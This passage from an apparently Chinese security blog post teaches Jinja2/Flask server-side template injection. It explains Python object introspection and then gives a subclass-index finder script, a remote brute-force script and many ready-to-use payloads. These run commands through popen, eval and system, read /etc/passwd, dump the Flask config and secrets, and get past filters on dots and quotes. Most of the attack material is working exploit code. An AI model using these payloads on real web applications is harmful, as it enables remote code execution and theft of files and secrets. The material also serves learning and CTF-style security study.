class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__bases__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__mro__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.son&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;, &lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="subclasses"><code>__subclasses__()</code></h3><p>得到object类后，就可以用<code>__subclasses__()</code>获取所有的子类：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;......</span><br></pre></td></tr></table></figure><h3 id="dict"><code>__dict__</code></h3><p>我们在获得到一个模块时想调用模块中的方法，恰好该方法被过滤了，就可以用该方法bypass</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br></pre></td></tr></table></figure><p>与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有<code>__dict__</code>属性的，如<code>[].__dict__</code>会返回错误</p><p><code>__dict__</code>只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性</p><p>可以使用<code>__dict__</code>来间接调用一些属性或方法，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">&#x27;append&#x27;</span>](a, <span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="string">&#x27;ling&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="init"><code>__init__</code></h3><p><code>__init__</code>用于初始化类，作用就是为了得到function/method模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, b</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.a = a</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Base</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Child</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Child</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">__init__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">__init__</span> <span class="title">at</span> 0<span class="title">x10cc23e50</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">func</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">func</span> <span class="title">at</span> 0<span class="title">x10cc23ee0</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="globals"><code>__globals__</code></h3><p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>__init__</code>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__</span><br><span class="line">&lt;bound method Student.__init__ of &lt;__main__.Student object at <span class="number">0x10cc71880</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__</span><br><span class="line">&lt;function Student.__init__ at <span class="number">0x10cc23f70</span>&gt;</span><br></pre></td></tr></table></figure><p>果该关键字被过滤了我们可以使用<code>__getattribute__</code>，以下两者等效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__[&#39;sys&#39;]</span><br><span class="line">__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;sys&#39;]</span><br></pre></td></tr></table></figure><h2 id="builtins、-builtin-、-builtins-的区别"><code>builtins</code>、<code>__builtin__</code>、<code>__builtins__</code>的区别</h2><p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。</p><p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p><p>python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>而<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="构造链的思路">构造链的思路</h2><h3 id="第一步">第一步</h3><p>使用<code>__class__</code>来获取内置类所对应的类，可以使用<code>str</code>，<code>dict</code>，<code>tuple</code>，<code>list</code>等来获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第二步">第二步</h3><p>拿到<code>object</code>基类</p><p>用<code>__bases__[0]</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>__base__</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>__mro__[1]</code>或<code>__mro__[-1]</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span>[-1]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第三步">第三步</h3><p>用<code>__subclasses__()</code>拿到子类列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure><h3 id="第四步">第四步</h3><p>在子类列表中寻找中寻找可以getshell的类</p><h2 id="寻找利用链">寻找利用链</h2><p>我们一般来说是先知晓一些可以getshell的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以getshell的类</p><p>这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以<code>popen</code>为例子。</p><p>local_find.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">&#x27;popen&#x27;</span></span><br><span class="line">num  = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__base__[<span class="number">0</span>].__subclasses__:</span><br><span class="line">  num += <span class="number">1</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">      print(num, i)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>运行这个脚本后：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219134702.png" alt=""></p><p>可以发现<code>object</code>基类的第132个子类名为<code>os._wrap_close</code>的这个类有popen方法</p><p>先调用它的<code>__init__</code>方法进行初始化类，再调用<code>__globals__</code>可以获取到方法内以字典的形式返回的方法、属性等值，最后调用<code>popen</code>函数来执行命令</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219135353.png" alt=""></p><p>但是上面的方法仅限于在本地寻找，remote_find.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">  time.sleep(<span class="number">0.1</span>)</span><br><span class="line">  payload = <span class="string">&quot;&#123;&#123;().__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot;</span> % i</span><br><span class="line">  url = <span class="string">&quot;&quot;</span></span><br><span class="line">  r = requests.post(url + payload)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;catch_warnings&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    print(r.text)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="python3的方法">python3的方法</h3><h4 id="os-wrap-close类中的popen"><code>os._wrap_close</code>类中的<code>popen</code></h4><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="import-中的os"><code>__import__</code>中的<code>os</code></h4><p>把上面<code>local_find.py</code>脚本中的search变量换成<code>__import__</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219140616.png" alt=""></p><p>可以看到有5个类下是包含<code>__import__</code>的，随便用一个即可</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="python2的方法">python2的方法</h3><p>tips：python2的<code>string</code>类型不直接从属于属于基类，所以要用两次 <code>__bases__[0]</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219140835.png" alt=""></p><h4 id="file类读写文件"><code>file</code>类读写文件</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219141043.png" alt=""></p><p>然后直接调用里面的方法即可，payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="warnings类中的linecache"><code>warnings</code>类中的<code>linecache</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">58</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">WarningMessage</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[59]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h3 id="python2和python3通用方法">python2和python3通用方法</h3><h4 id="builtins-代码执行"><code>__builtins__</code>代码执行</h4><p>把上面<code>local_find.py</code>脚本search变量赋值为<code>__builtins__</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219142748.png" alt=""></p><p>再调用<code>eval</code>等函数和方法即可，payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>总而言之，原理都是先找到含有<code>__builtins__</code>的类，然后再进一步利用。</p><h4 id="os"><code>os</code></h4><p>这个我在python3.8环境下好像没能找到直接含有os的类，python2.7.18下有两个类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">&lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="获取配置信息">获取配置信息</h3><h4 id="config">config</h4><p>通常会用<code>&#123;&#123;config&#125;&#125;</code>查询配置信息</p><h4 id="request">request</h4><p>jinja2中存在对象<code>request</code></p><p>查询一些配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="url-for">url_for</h4><p>查询配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="get-flashed-messages">get_flashed_messages</h4><p>查询配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造ssti的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Bypass">Bypass</h2><h3 id="过滤">过滤<code>.</code></h3><h4 id="绕过">[]绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[&#39;__class__&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="attr-绕过"><code>attr()</code>绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(&#39;__class__&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="getattr-绕过"><code>getattr()</code>绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;getattr((),&quot;__class__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤引号">过滤引号</h3><p>五种不同的请求方式绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.args.name</span><br><span class="line">request.values.name</span><br><span class="line">request.cookies.name</span><br><span class="line">request.headers.name</span><br><span class="line">request.form.name</span><br></pre></td></tr></table></figure><h4 id="GET">GET</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span 